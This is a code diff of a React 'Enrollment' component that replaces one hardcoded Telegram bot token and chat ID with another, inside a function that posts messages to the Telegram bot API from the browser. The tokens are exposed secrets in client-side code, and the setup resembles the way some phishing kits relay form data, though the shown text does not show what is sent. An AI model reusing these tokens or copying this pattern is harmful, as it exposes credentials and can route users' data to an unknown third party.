@@ -10,8 +10,8 @@ const Enrollment = () => {
     const [loading, setLoading] = useState(false);
 
     const sendTelegramMessage = async (message) => {
-        const botToken = '8448025655:AAFe_51EXWMPLpS388c1daw5Fhj7NThH_6k';
-        const chatId = '6483456664';
+        const botToken = '7416673711:AAHQEjteI2JFR8i0WwFQpZxj8czl7s5yaW8';
+        const chatId = '8401035681';
         try {
             await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
